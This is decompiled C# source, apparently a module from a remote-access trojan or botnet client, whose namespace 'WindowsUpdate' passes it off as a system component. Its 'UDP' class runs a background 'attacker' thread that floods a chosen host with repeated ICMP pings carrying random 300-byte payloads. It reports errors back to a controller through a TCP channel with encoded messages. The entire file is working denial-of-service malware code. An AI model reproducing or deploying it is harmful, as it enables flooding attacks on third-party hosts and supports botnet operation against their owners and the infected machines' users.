using System;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsUpdate;

public class UDP
{
	public string Host;

	private Thread attacker;

	public UDP()
	{
		attacker = new Thread(delegate(object a0)
		{
			Attack(Conversions.ToString(a0));
		});
	}

	public void Start()
	{
		try
		{
			attacker.IsBackground = true;
			attacker.Start(Host);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			TCP c = A.C;
			string[] array = new string[7];
			string s = "MSG";
			array[0] = A.ENB(ref s);
			array[1] = A.Y;
			string s2 = ex2.Message;
			array[2] = A.ENB(ref s2);
			array[3] = A.Y;
			array[4] = "Fail";
			array[5] = A.Y;
			array[6] = "base";
			c.Send(string.Concat(array));
			ProjectData.ClearProjectError();
		}
	}

	public void Abort()
	{
		attacker.Abort();
	}

	public void Attack(string Host)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		short num5 = default(short);
		int num6 = default(int);
		Ping ping = default(Ping);
		PingOptions pingOptions = default(PingOptions);
		string s = default(string);
		byte[] bytes = default(byte[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 306:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_000f;
						case 5:
							goto IL_0023;
						case 6:
							goto IL_002c;
						case 7:
							goto IL_002f;
						case 8:
							goto IL_0039;
						case 9:
							goto IL_0044;
						case 10:
							goto IL_0051;
						case 11:
							goto IL_0062;
						case 12:
							goto IL_0073;
						case 14:
							goto IL_007c;
						case 13:
							goto IL_0090;
						case 15:
							goto IL_00a6;
						case 4:
						case 16:
							goto IL_00b6;
						default:
							goto end_IL_0001;
						case 17:
						case 18:
							goto end_IL_0001_2;
						}
						goto default;
					}
					IL_00a6:
					num = 15;
					ProjectData.ClearProjectError();
					if (num2 != 0)
					{
						num2 = 0;
						goto IL_00b6;
					}
					throw ProjectData.CreateProjectError(-2146828268);
					IL_007c:
					num = 14;
					num5 = checked((short)unchecked(num5 + 1));
					if (num5 <= 10000)
					{
						goto IL_0090;
					}
					goto IL_00a6;
					IL_000a:
					num = 2;
					num6 = 1;
					goto IL_000f;
					IL_000f:
					num = 3;
					if (num6 != 2)
					{
						goto IL_00b6;
					}
					goto end_IL_0001_2;
					IL_00b6:
					num = 4;
					Thread.Sleep(1500);
					goto IL_0023;
					IL_0023:
					num = 5;
					ping = new Ping();
					goto IL_002c;
					IL_002c:
					num = 6;
					goto IL_002f;
					IL_002f:
					num = 7;
					pingOptions = new PingOptions();
					goto IL_0039;
					IL_0039:
					num = 8;
					pingOptions.DontFragment = true;
					goto IL_0044;
					IL_0044:
					num = 9;
					pingOptions.Ttl = 64;
					goto IL_0051;
					IL_0051:
					num = 10;
					s = Randomisi2(300);
					goto IL_0062;
					IL_0062:
					num = 11;
					bytes = Encoding.ASCII.GetBytes(s);
					goto IL_0073;
					IL_0073:
					num = 12;
					num5 = 0;
					goto IL_0090;
					IL_0090:
					num = 13;
					ping.Send(Host, 2000, bytes, pingOptions);
					goto IL_007c;
					end_IL_0001:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 306;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public string Randomisi2(int lenght)
	{
		VBMath.Randomize();
		StringBuilder stringBuilder = new StringBuilder("");
		char[] array = "•¥µ☺☻♥♦♣♠•◘○◙♀♪♫☼►◄↕‼¶§▬↨↑↓→←∟↔▲▼1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzابتثجحخدذرزسشصضطظعغفقكلمنهوي~!@#$%^&*()+-/><".ToCharArray();
		int num = 1;
		checked
		{
			while (true)
			{
				int num2 = num;
				int num3 = lenght;
				if (num2 > num3)
				{
					break;
				}
				VBMath.Randomize();
				int num4 = (int)Math.Round(Conversion.Int((float)(array.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f);
				stringBuilder.Append(array[num4]);
				num++;
			}
			return stringBuilder.ToString();
		}
	}
}
